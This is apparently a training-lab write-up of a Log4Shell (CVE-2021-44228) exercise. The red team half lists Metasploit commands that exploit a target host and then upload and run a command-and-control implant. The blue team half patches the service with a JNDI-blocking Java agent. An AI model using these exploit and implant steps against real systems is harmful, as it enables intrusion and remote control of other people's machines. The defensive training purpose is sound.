Red team exercise

1. nmap -T4 -A 172.16.100.90 (i always nmap just to see what's running even though it's not really necessary for this challenge)
2. Opened terminal
3. cd ~/Desktop/Resources
4. msfconsole to start metasploit
5. search cve:CVE-2021-44228
6. use exploit/multi/http/log4shell_header_injection
7. set lhost 172.16.200.12
8. set srvhost 172.16.200.12
9. set rhost 172.16.100.90
10. exploit
11. upload deploy_c2 /tmp
12. cd /tmp/
13. execute -f chmod -a "+x deploy_c2" (since my status on the challenge is not updating i did try exact path for /tmp/deploy_c2 in my execute as well, still no dice)
14. execute -f ./deploy_c2

Successfully completed red team exercise

____________________________________________________________________________

Blue team exercise

1. transfer log4j-jndi-be-gone-standalone.jar to blue team machine using scp
    1. sudo scp log4j-jndi-be-gone-standalone.jar playerone@172.16.100.100:~
2. ssh playerone@172.16.100.100
3. sudo cp log4j-jndi-be-gone-standalone.jar /opt
4. Add required changes to dasmsp.service (change in bold)
    1. ExecStart=/usr/lib/jvm/nvidia-java-8-openjdk-amd64/bin/java **-javaagent:/opt/log4j-jndi-begone-standalone.jar** -jar /opt/dasmsp.jar
5. sudo systemctl daemon-reload
6. sudo systemctl restart dasmsp.service

Success!